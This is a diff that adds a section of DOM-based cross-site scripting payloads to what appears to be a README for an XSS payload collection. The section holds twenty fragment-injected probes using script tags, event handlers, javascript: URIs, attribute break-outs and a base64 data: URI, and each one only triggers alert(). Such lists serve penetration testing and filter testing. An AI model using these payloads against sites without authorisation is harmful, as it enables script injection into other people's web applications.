@@ -160,4 +160,30 @@ This repository features payloads for the following XSS attack types:
 
 ---
 
+# DOM-Based XSS Payloads
 
+### Common DOM-Based XSS Payloads
+- `#<script>alert('DOM XSS')</script>`
+- `#<img src=x onerror=alert('DOM XSS')>`
+- `#<svg onload=alert('DOM XSS')>`
+- `#<iframe src="javascript:alert('DOM XSS')"></iframe>`
+- `#<body onload=alert('DOM XSS')>`
+- `#<link rel="stylesheet" href="javascript:alert('DOM XSS')">`
+- `#<a href="javascript:alert('DOM XSS')">Click me</a>`
+- `#<input value="" onfocus="alert('DOM XSS')">`
+- `#<div onmouseover="alert('DOM XSS')">Hover me</div>`
+- `#<marquee onstart="alert('DOM XSS')">Scroll me</marquee>`
+
+### Advanced DOM-Based XSS Techniques
+- `#"><img src=x onerror=alert('DOM XSS')>`
+- `#"><svg onload=alert('DOM XSS')>`
+- `#<img src=1 onerror='alert("DOM XSS")'>`
+- `#<svg><script>alert('DOM XSS')</script>`
+- `#javascript:alert('DOM XSS')`
+- `#data:text/html;base64,PHNjcmlwdD5hbGVydCgnRE9NIFhTUycpPC9zY3JpcHQ+`
+- `#<iframe src="javascript:alert('DOM XSS')"></iframe>`
+- `#" onfocus="alert('DOM XSS')" autofocus`
+- `#" onclick="alert('DOM XSS')">Click me`
+- `#'><img src=x onerror=alert('DOM XSS')>`
+
+---
